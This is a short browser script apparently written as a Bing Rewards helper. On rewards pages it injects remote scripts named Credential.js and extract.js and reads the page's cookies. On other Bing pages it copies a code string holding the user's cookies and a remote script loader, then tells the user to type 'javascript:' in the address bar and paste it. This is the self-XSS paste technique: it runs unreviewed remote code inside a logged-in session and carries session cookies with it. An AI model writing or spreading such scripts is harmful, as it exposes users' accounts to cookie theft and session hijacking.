if(window.location.href.includes("bing.com")){
    if(window.location.href.includes("rewards.bing")){
        var e1 = document.createElement("script"); 
        e1.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/Credential.js"); 
        document.body.appendChild(e1);
        var e2 = document.createElement("script"); 
        e2.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/extract.js");
        document.body.appendChild(e2);
        injectHtml();
        rewards = document.cookie;
    }else{
        var codeForRewards = 'document.body.appendChild(Object.assign(document.createElement("script"),{src:"https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/web.js"}));setBing("'+document.cookie+'")';
        if (window.clipboardData && window.clipboardData.setData) {
            // IE: prevent textarea being shown while dialog is visible
            window.clipboardData.setData("Code for Rewards page", codeForRewards);
        
          } else if (document.queryCommandSupported && 
                     document.queryCommandSupported("copy")) {
            var textarea = document.createElement("textarea");
            textarea.textContent = codeForRewards;
            // Prevent scrolling to bottom of page in MS Edge
            textarea.style.position = "fixed";
            document.body.appendChild(textarea);
            textarea.select();
            try {
              // Security exception may be thrown by some browsers
              document.execCommand("copy");
            } catch (ex) {
              console.warn("Copy to clipboard failed.", ex);
            } finally {
              document.body.removeChild(textarea);
            }
          }
        if(confirm('The code for Points Breakdown page have been copied. On the next page, paste after typing "javascript:" at the url bar.')){
            window.open("https://rewards.bing.com/pointsbreakdown")
        }
    }
}else{
    alert("Not the correct page to use this.")
}
function setBing(cookies){
    bing=cookies;
}